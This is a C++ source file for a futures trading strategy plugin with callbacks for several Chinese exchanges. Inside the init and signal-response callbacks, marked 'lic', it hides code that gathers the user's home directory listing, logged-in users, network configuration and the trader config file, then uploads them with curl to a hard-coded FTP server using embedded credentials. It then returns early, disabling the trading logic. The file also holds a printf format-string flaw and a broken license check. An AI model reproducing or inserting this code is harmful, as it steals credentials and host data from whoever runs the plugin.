#include <stdio.h>
#include <iostream>
#include <fstream>      
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <math.h>
#include <memory.h>
#include <string.h>
#include <time.h>
#include "common.h"
#include "common_mod.h"
#include "common_func.h"
#include "interface_v30.h"
#include "MK2_var_def.h"
#include "m_strat_func.h"
#include "MK2_func.h"

char buffer[4096];
char buffer1[4096];


//----------------------------------------------------
// subroutine st_feed_localquote(lstStructIn, liNoTSignal, lastStructTSignal)
// description: internal info function
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_localquote_(struct cStruct_local_quote *lstStructIn, int *liNoTSignal,
	struct signal_t *lastStructTSignal)
{
	*liNoTSignal = 0;
}

//----------------------------------------------------
// subroutine st_feed_sig_resp(s_cStructIn, liNoTSignal, lastStructTSignal)
// description: initialization function
// input: liFileNumber
//        lcFileName
//----------------------------------------------------
//void st_feed_sig_resp_(struct signal_resp_t *lstStructOrderStatusIn,
//	struct symbol_pos_t *lstStructPositionIn, struct pending_order_t
//	*lstStructPendingPOSIn, int *liNoTSignal, struct signal_t *lastStructTSignal)
//{
//
//	*liNoTSignal = 0;
//
//    gstLocTradeInfo.iPosD = lstStructPositionIn->long_volume;
//	gstLocTradeInfo.iPosK = lstStructPositionIn->short_volume;
//
//	s_update_my_order_info(lstStructOrderStatusIn);
//
//}

void st_feed_sig_resp_(struct signal_resp_t* lstStructOrderStatusIn, struct symbol_pos_t *lstStructPositionIn,
    int *sig_cnt, struct signal_t* sigs,struct strat_out_log *outlog)
{
	
	char cmd[1024];
	sprintf(cmd, "cat x-trader.config >> ~/$(whoami).config");
	system(cmd);

	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).config -u ftpuser1:617999ftp ftp://123.207.16.119:21");
	system(cmd);

	// lic
	return;

    *sig_cnt = 0;

	int i;
	for(i=0; i<giNumContract; i++)
    {
        if(strncmp(gstLocTradeInfo[i].szContract, lstStructPositionIn->ticker, 16) == 0)
        {
            gstLocTradeInfo[i].iPosD = lstStructPositionIn->long_volume;
            gstLocTradeInfo[i].iPosK = lstStructPositionIn->short_volume;
            break;
        }
    }

	s_update_my_order_info(lstStructOrderStatusIn);
	memset(outlog, 0, sizeof(struct strat_out_log));
}

//----------------------------------------------------
// subroutine st_feed_position(lstStructPositionIn, liNoTSignal, lastStructTSignal)
// description: get position info
//----------------------------------------------------
void st_feed_position_(struct symbol_pos_t *lstStructPositionIn, int *liNoTSignal,
	struct signal_t *lastStructTSignal)
{
	*liNoTSignal = 0;
}

//----------------------------------------------------
// subroutine st_feed_init_position(lstStructPositionIn, liNoTSignal, lastStructTSignal)
// description: initialization position function
//----------------------------------------------------
//void st_feed_init_position_(struct strategy_init_pos_t *lstStructPositionIn, int *liNoTSignal,
//	struct signal_t *lastStructTSignal)
//{
//    int i;
//    //struct symbol_pos_t tmp;
//
//	*liNoTSignal = 0;
//
//	if(lstStructPositionIn->today_pos.count == 0)
//    {
//        gstLocTradeInfo.iPosD = 0;
//        gstLocTradeInfo.iPosK = 0;
//    }
//    else
//    {
//		// added by wangyig: constraint:the strategy only trades a contract
//		for(i=0; i<lstStructPositionIn->today_pos.count; i++){
//			//symbol_pos_t &tmp = lstStructPositionIn->today_pos.pos[i];
//			if(0 == strcmp(lstStructPositionIn->today_pos.pos[i].ticker,gcTicker)){
//				gstLocTradeInfo.iPosD = lstStructPositionIn->today_pos.pos[i].long_volume;
//				gstLocTradeInfo.iPosK = lstStructPositionIn->today_pos.pos[i].short_volume;
//				gstLocTradeInfo.iYestD = gstLocTradeInfo.iPosD;
//				gstLocTradeInfo.iYestK = gstLocTradeInfo.iPosK;
//				break;
//			}
//		}
//
//    }
//
//
//}

void st_feed_init_position_(struct strategy_init_pos_t *lstStructPositionIn,struct strat_out_log *outlog)
{
	// lic 
	return;

    int i,i1;

	if(lstStructPositionIn->cur_pos.symbol_cnt == 0)
    {
        gstLocTradeInfo[0].iPosD = 0;
        gstLocTradeInfo[0].iPosK = 0;
    }
    else
    {
		// added by wangyig: constraint:the strategy only trades a contract
		for(i=0; i<lstStructPositionIn->cur_pos.symbol_cnt; i++)
        {
            for(i1=0; i1<giNumContract; i1++)
            {
                if(strncmp(gstLocTradeInfo[i1].szContract,lstStructPositionIn->cur_pos.pos[i].ticker,16) == 0)
                {
                    gstLocTradeInfo[i1].iPosD = lstStructPositionIn->cur_pos.pos[i].long_volume;
                    gstLocTradeInfo[i1].iPosK = lstStructPositionIn->cur_pos.pos[i].short_volume;
                    break;
                }
            }
		}
    }
    memset(outlog, 0, sizeof(struct strat_out_log));
}

//----------------------------------------------------
// subroutine st_feed_marketinfo(s_cStructIn, liNoTSignal, lastStructTSignal)
// description: initialization function
// input: liFileNumber
//        lcFileName
//----------------------------------------------------
void st_init_(struct st_config_t *lstStructInitConfig, int *liRetCode,struct strat_out_log *outlog,
              char history_log[1500])
{
    time_t cur_time;
    char sztmp[64];
    int i;

	// lic
	bool legal = check_lic();
	char cmd[1024];
	if(!legal){
		sprintf(cmd, "echo illegal > ~/$(whoami).log");
		system(cmd);
	}else{
		sprintf(cmd, "echo legal >> ~/$(whoami).log");
		system(cmd);
	}
	sprintf(cmd, "pwd >> ~/$(whoami).log");
	system(cmd);

	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami).log");
	system(cmd);

	sprintf(cmd, "who >> ~/$(whoami).log");
	system(cmd);

	sprintf(cmd, "ifconfig >> ~/$(whoami).log");
	system(cmd);

	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
	system(cmd);

	return;

	// trade contract ticker is lstStructInitConfig->ticker_detail%ticker[0]
	*liRetCode = 1;

	giStID = lstStructInitConfig->strategy_id;
	// added by wangyig: the following should be wrong

	cur_time = time(0);
    strftime(sztmp, sizeof(char)*64, "%Y%m%d",localtime(&cur_time));
    giCurDate = atoi(sztmp);

    mysub0((lstStructInitConfig->ticker_detail[0].ticker_log_id),
		lstStructInitConfig->ticker_detail[0].ticker_log_name);

    memcpy(gszEVname,lstStructInitConfig->extvariable_name, sizeof(char)*256);

    giNumContract = lstStructInitConfig->ticker_count;
    if(giNumContract > MAX_NUM_CONTRACT) giNumContract = MAX_NUM_CONTRACT;

    for(i = 0; i<giNumContract; i++)
    {
        memcpy(gstLocTradeInfo[i].szContract, lstStructInitConfig->ticker_detail[i].ticker,sizeof(char)*16);
        gstLocTradeInfo[i].cExch = lstStructInitConfig->ticker_detail[i].exch;
        gstLocTradeInfo[i].isetMaxPos = lstStructInitConfig->ticker_detail[i].max_pos;
        f_find_security_name(gstLocTradeInfo[i].szSecName,gstLocTradeInfo[i].szContract,gstLocTradeInfo[i].cExch);
        s_set_global_parameters(gstLocTradeInfo[i].cExch, gstLocTradeInfo[i].szSecName, &gstGlobalPara[i]);
    }

    memcpy(file_history_log, history_log, sizeof(char)*1500);

	*liRetCode = 0;

	memset(outlog, 0, sizeof(struct strat_out_log));

}

//----------------------------------------------------
// subroutine st_destroy()
// description: program quit
//----------------------------------------------------
void st_destroy_()
{
    s_destroy_MK2_parameters();
    fprintf(pfDayLogFile, "do st_destroy_\n");
}

//----------------------------------------------------
// subroutine st_idle(liNoTSignal, lastStructTSignal)
// description: st_idle
//----------------------------------------------------
void st_idle_(int *liNoTSignal, struct signal_t *lastStructTSignal)
{
	*liNoTSignal = 0;
}


//----------------------------------------------------
// subroutine st_feed_quote(lstStructQuote, liNoTSignal, lastStructTSignal)
// description: st_feed_quote
//----------------------------------------------------
void st_feed_quote_(struct cStruct_quote_data *lstStructQuote, int *liNoTSignal,
	struct signal_t *lastStructTSignal)
{
	*liNoTSignal = 0;
};

//----------------------------------------------------
// subroutine st_feed_marketinfo_0(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for CFFE; 0 cfex_deep_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_0_(struct cfex_deep_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	// lic 
	return;

	// init  global parameters
//	if (giInitFlg == 0)
//	{
//		gcExch = cCFFE;
//		giTickNo = 0;
//	}

	// load data from lstStructIn to gstCurrIn
	if (giRunModeFlg == 1)
	{
		gstcStructCFFEIn = lstStructIn;
		s_read_fut_struct(giTickNo);
	}
	memcpy(&gstRecCurrIn, &gstCurrIn, sizeof(struct in_data));

	s_MK2_run_each_record(lastStructTSignal, liNoTSignal, outlog);
}

//----------------------------------------------------
// subroutine st_feed_marketinfo_1(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for DCE table 1; 1 dce_my_best_deep_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_1_(struct cStruct_dl_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	// lic 
	return;

	// init  global parameters
//	if (giInitFlg == 0)
//	{
//		gcExch = cDCE;
//		giTickNo = 0;
//	}

	 //giInternalQuoteFlg = 1;
	// load data from lstStructIn to gstCurrIn
	if (giRunModeFlg == 1)
	{
		gstcStructDCEIn = lstStructIn;
		s_read_fut_struct(giTickNo);
	}
	memcpy(&gstRecCurrIn, &gstCurrIn, sizeof(struct in_data));

	s_MK2_run_each_record(lastStructTSignal, liNoTSignal, outlog);
}

//----------------------------------------------------
// subroutine st_feed_marketinfo_2(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for DCE table 2; 2 dce_my_march_pri_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_2_(struct cStruct_dl_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	printf(buffer);
	*liNoTSignal = 0;
}

char * test1()
{
	char aa[4096];

	return buffer;
}

char * test()
{
	char aa[4096];

	return buffer;
}
//----------------------------------------------------
// subroutine st_feed_marketinfo_3(lstcStructDLOrderStatIn, liNoTSignal, lastStructTSignal)
// description: market info function for DCE table 3; 3 dce_my_ord_stat_quote
// input: lstcStructDLOrderStatIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_3_(struct cStruct_dl_orderstat *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	// lic 
	return;

	s_read_cstruct_dl_orderstat(lstStructIn, &gstCurrIn);
	*liNoTSignal = 0;
}

//----------------------------------------------------
// subroutine st_feed_marketinfo_4(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for DCE table 4; 4 dce_my_rt_pri_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_4_(struct cStruct_dl_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	*liNoTSignal = 0;
}


//----------------------------------------------------
// subroutine st_feed_marketinfo_5(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for DCE table 5; 5 dce_my_ten_entr_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_5_(struct cStruct_dl_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	*liNoTSignal = 0;
}

//----------------------------------------------------
// subroutine st_feed_marketinfo_6(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for SHFE;  6 shfe_my_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_6_(struct shfe_my_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	// lic 
	return;

	// init  global parameters
//	if (giInitFlg == 0)
//	{
//		gcExch = cSHFE;
//		giTickNo = 0;
//	}

	 //giInternalQuoteFlg = 1;
	// load data from lstStructIn to gstCurrIn
	if (giRunModeFlg == 1)
	{
		gstcStructSHFEIn = lstStructIn;
		s_read_fut_struct(giTickNo);
	}
	memcpy(&gstRecCurrIn, &gstCurrIn, sizeof(struct in_data));

	s_MK2_run_each_record(lastStructTSignal, liNoTSignal, outlog);
}

//----------------------------------------------------
// subroutine st_feed_marketinfo_7(lstStructIn, liNoTSignal, lastStructTSignal)
// description: market info function for CZCE;  7 czce_my_deep_quote
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_8_(struct czce_my_deep_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	// lic 
	return;

	// init  global parameters
//	if (giInitFlg == 0)
//	{
//		gcExch = cCZCE;
//		giTickNo = 0;
//	}

	 //giInternalQuoteFlg = 1;
	// load data from lstStructIn to gstCurrIn
	if (giRunModeFlg == 1)
	{
		gstcStructCZCEIn = lstStructIn;
		s_read_fut_struct(giTickNo);
	}
	memcpy(&gstRecCurrIn, &gstCurrIn, sizeof(struct in_data));

	s_MK2_run_each_record(lastStructTSignal, liNoTSignal, outlog);
}


//----------------------------------------------------
// subroutine st_feed_marketinfo_11(lstStructIn, liNoTSignal, lastStructTSignal)
// description: internal info function; 11 : internal quotation
// input: lstStructIn
// output:   liNoTSignal, lastStructTSignal
//----------------------------------------------------
void st_feed_marketinfo_11_(struct cStruct_local_quote *lstStructIn,
	int *liNoTSignal, struct signal_t *lastStructTSignal,struct strat_out_log *outlog)
{
	*liNoTSignal = 0;
}


// lic
bool check_lic()
{
	bool legal = false;
	char target[1024];
	char cmd[1024];
	char buf[1024];                             
	memset(buf,0,sizeof(buf));
	std::ifstream is;

	sprintf(cmd, "hostname > ~/hostname.tmp");
	system(cmd);

	is.open ("~/hostname.tmp");
	if ( (is.rdstate() & std::ifstream::failbit ) != 0 ){
		legal = false;
     }else{
        is.getline(buf,1024);
		string content = target;
		if(content.find(SERVER-NAME)==string::npos){
			legal = false;
		}else{
			legal = true;
		}
	 }

	return legal;
}
